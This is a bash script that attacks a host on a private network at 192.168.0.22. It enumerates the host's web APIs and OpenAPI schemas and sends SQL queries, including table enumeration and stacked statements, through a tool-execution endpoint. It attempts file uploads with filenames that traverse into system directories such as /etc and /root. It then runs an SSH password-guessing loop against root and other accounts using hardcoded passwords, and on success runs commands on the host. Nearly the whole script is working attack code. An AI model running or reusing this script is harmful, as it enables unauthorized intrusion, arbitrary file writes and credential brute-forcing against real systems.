#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
H=192.168.0.22; L=/root/ul_farmfan/o4.txt; mkdir -p /root/ul_farmfan; : > $L
log(){ echo "$@" | cut -c1-900 >> $L; }
px(){ timeout 9 curl -s -m 7 -X POST "$1" -H 'Content-Type: application/json' -d "$2" -w "|%{http_code}" 2>/dev/null; }
log "S $(date -u +%FT%TZ) user=$(id -un)"
log "TOOLS18000 $(timeout 8 curl -s -m 6 http://$H:18000/tools | tr -d '\n' | cut -c1-2500)"
log "TOOLCHAIN $(command -v sshpass; command -v ssh; python3 -c 'import paramiko;print("paramiko-ok")' 2>&1 | tail -1)"
log "BODYUPLOAD $(timeout 8 curl -s -m 6 http://$H:14998/openapi.json | python3 -c 'import json,sys;d=json.load(sys.stdin);print(json.dumps(d["components"]["schemas"]["Body_upload_upload_post"]))' 2>&1 | cut -c1-800)"
log "BODYTNSD $(timeout 8 curl -s -m 6 http://$H:14998/openapi.json | python3 -c 'import json,sys;d=json.load(sys.stdin);print(json.dumps(d["components"]["schemas"]["Body_tnsd_preview_api_tnsd_preview_post"]))' 2>&1 | cut -c1-600)"
log "DL1 $(timeout 8 curl -s -m 6 http://$H:14998/files/895d85cc-ce3d-49a4-8cb1-320f76295697/download -w '|%{http_code}' | tr '\n' ' ' | cut -c1-200)"
log "STATIC1 $(timeout 8 curl -s -m 6 http://$H:14998/uploads/ul_rel.json -w '|%{http_code}' | tr '\n' ' ' | cut -c1-200)"
log "STATIC2 $(timeout 8 curl -s -m 6 http://$H:14998/file/ul_rel.json -w '|%{http_code}' | tr '\n' ' ' | cut -c1-200)"
for ep in eventclassify point2/analyze point3/analyze api/batch_test api/sentiment_detail_steps ea/discover ta/evaluate llm/generate predict; do
  log "EMPTY $ep $(px http://$H:14998/$ep '{}' | tr '\n' ' ')"
done
log "RDBPRAGMA $(px http://$H:18000/execute '{"engine":"relational_db","operation":"query","arguments":{"sql":"select * from pragma_database_list"}}' | tr '\n' ' ')"
log "RDBTBL $(px http://$H:18000/execute '{"engine":"relational_db","operation":"query","arguments":{"sql":"select name from sqlite_master where type=\"table\""}}' | tr '\n' ' ')"
log "RDBMULTI $(px http://$H:18000/execute '{"engine":"relational_db","operation":"query","arguments":{"sql":"select 1; select 2"}}' | tr '\n' ' ')"
for fn in /var/tmp/ul_p4 /dev/shm/ul_p4 /home/ul_p4 /opt/ul_p4 /srv/ul_p4 /usr/local/bin/ul_p4 /root/ul_p4 /etc/ul_p4; do
  B=$(timeout 8 curl -s -m 6 -X POST http://$H:14998/upload -F "file=@/tmp/m3.json;filename=$fn" -w "|%{http_code}")
  log "W $fn => $(echo "$B" | tr '\n' ' ' | cut -c1-260)"
done
log "SSHLADDER"
for u in root ubuntu kgzs; do
  for p in 'Admin@123_para#!2024' 'Beijingcs.2024' 'Bingxing.2026' 'Kgzs@2024' 'ubuntu@'; do
    if command -v sshpass >/dev/null 2>&1; then
      R=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$H 'id; hostname; nvidia-smi -L 2>/dev/null|head -3' 2>&1 | tr '\n' ' ' | cut -c1-200)
      log "SSH $u/$p => $R"
    else
      log "SSH $u/$p => (no sshpass)"; break
    fi
  done
done
log "E $(date -u +%FT%TZ)"
tail -c 6000 $L
